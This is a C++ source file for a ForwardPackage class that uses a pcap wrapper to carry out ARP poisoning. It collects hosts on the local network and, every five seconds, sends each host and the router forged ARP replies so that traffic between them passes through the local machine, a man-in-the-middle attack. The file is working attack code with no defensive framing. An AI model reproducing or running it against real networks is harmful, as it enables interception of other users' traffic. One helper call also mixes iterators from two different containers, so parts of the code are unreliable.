#include "forwardpackage.h"

#include <iostream>
#include <algorithm>
#include <memory>

#include <pcapwrapper/controller.hpp>
#include <pcapwrapper/interfaces/interface.h>
#include <pcapwrapper/processors/processor.h>
#include <pcapwrapper/network/packages/arppackage.h>
#include <pcapwrapper/network/builders/builder.h>
#include <pcapwrapper/network/builders/keys.h>

template <typename IT, typename V>
bool exists(IT begin, IT end, const V &v) {
    auto it = std::find(begin, end, v);
    return !(it == end);
}

ForwardPackage::ForwardPackage(PCAP::IpAddress local_ip,
                   PCAP::MacAddress local_mac,
                   PCAP::IpAddress router_ip,
                   PCAP::MacAddress router_mac,
                   const std::string& interface_name)
    : m_local_ip{local_ip}
    , m_local_mac{local_mac}
    , m_router_ip{router_ip}
    , m_router_mac{router_mac}
    , m_interface_name{interface_name}
    , m_stop{false}
{
    m_new_clients.reserve(10);
    m_existing_clients.reserve(10);
    m_future_clients = std::async(std::launch::async, &ForwardPackage::clients_receivers, this);
    m_future_working = std::async(std::launch::async, &ForwardPackage::working_function, this);
}

void ForwardPackage::new_client(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
    // receive arp replies from clients
    std::lock_guard<std::mutex> lock(m_mutex);
    auto it = std::find_if(m_new_clients.begin(), m_new_clients.end(), [&target_ip, &target_mac](auto &a)
                            {return target_ip == a.m_ip && target_mac == a.m_mac; });
    if (it == m_new_clients.end()) {

        m_new_clients.emplace_back(NetworkClient(target_ip, target_mac));
    }
}

void ForwardPackage::clients_receivers() {
    // every 20 seconds if there are new clients or clients didn't reply
    while (!m_stop) {
        if (m_stop) return;
        {
            std::lock_guard<std::mutex> lock(m_mutex);
            // stop threads for clients that didn't reply.
            for_each(m_existing_clients.begin(), m_existing_clients.end(), [this](auto &client){
                if (!exists(m_new_clients.begin(), m_existing_clients.end(), client)) {
                    //std::cout << "Stoping thread: " << client.m_ip << " " << client.m_mac << std::endl;
                    //client.m_running = false;
                }
            });
            // start new threads for new clients.
            for_each(m_new_clients.begin(), m_new_clients.end(), [this](auto &client){
                if (!exists(m_existing_clients.begin(), m_existing_clients.end(), client)) {
                    std::cout << "Starting thread: " << client.m_ip << " " << client.m_mac << std::endl;
                    m_existing_clients.push_back(client);
                }
            });
            // clear new_clients to start again
            m_new_clients.clear();
        }

        // sleep, for other clients to reply
        using namespace std::chrono_literals;
        std::this_thread::sleep_for(20s);
    }
}

void ForwardPackage::stop() {
    // stop for checking for other threads
    m_stop = true;
    {
        // stop all
        m_future_clients.get();
        std::lock_guard<std::mutex> lock(m_mutex);
        for_each(m_existing_clients.begin(), m_existing_clients.end(), [this](auto &client) {
            client.m_running = false;
        });
        m_future_working.get();
    }
}

void ForwardPackage::working_function() {
    auto controller = std::make_shared<PCAP::Controller<PCAP::Interface, PCAP::Processor>>(m_interface_name);

    while (!m_stop) {
        {
            // do arp poison
            std::lock_guard<std::mutex> lock(m_mutex);
            for (auto &client : m_existing_clients) {
                using namespace PCAP::PCAPBuilder;
                auto package_router = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
                                                                {Keys::Key_Eth_Mac_Src, Option{m_local_mac}},
                                                                {Keys::Key_Eth_Mac_Dst, Option{m_router_mac}},
                                                                {Keys::Key_Arp_Mac_Src, Option{m_local_mac}},
                                                                {Keys::Key_Arp_Mac_Dst, Option{m_router_mac}},
                                                                {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
                                                                {Keys::Key_Ip_Src, Option{client.m_ip}},
                                                                {Keys::Key_Ip_Dst, Option{m_router_ip}}});
                controller->write(package_router.getPackage(), 60);

                auto package_target = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
                                                                {Keys::Key_Eth_Mac_Src, Option{m_local_mac}},
                                                                {Keys::Key_Eth_Mac_Dst, Option{client.m_mac}},
                                                                {Keys::Key_Arp_Mac_Src, Option{m_local_mac}},
                                                                {Keys::Key_Arp_Mac_Dst, Option{client.m_mac}},
                                                                {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
                                                                {Keys::Key_Ip_Src, Option{m_router_ip}},
                                                                {Keys::Key_Ip_Dst, Option{client.m_ip}}});
                controller->write(package_target.getPackage(), 60);
            }

            // remove clients that didn't reply
            m_existing_clients.erase(std::remove_if(m_existing_clients.begin(), m_existing_clients.end(), [](auto &client){
                return !client.m_running;
            }),m_existing_clients.end());
        }

        using namespace std::chrono_literals;
        std::this_thread::sleep_for(5s);
    }
}
